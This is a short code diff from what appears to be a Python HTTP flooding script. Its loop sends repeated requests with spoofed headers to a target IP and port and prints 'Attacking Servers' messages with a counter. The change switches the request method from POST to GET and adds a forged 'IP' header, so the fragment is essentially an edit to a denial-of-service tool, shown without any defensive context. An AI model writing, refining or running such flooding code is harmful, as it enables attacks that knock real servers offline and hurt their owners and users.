@@ -66,9 +66,10 @@ while True:
                 "Connection": "Keep-Alive",
                 "Referer": f"{res}",
                 "Cache-Control": "no-store, no-cache",
-                "Host": f"{fip}"
+                "Host": f"{ip}",
+                "IP": f"{fip}"
             }
-            response = requests.post(url, headers=headers)
+            response = requests.get(url, headers=headers)
             print(f"{red}Attacking {yellow}Servers{red} At{blue} {ip} {red}Port {blue}{port} : {white}", counter)
             print(response)
         except KeyboardInterrupt:
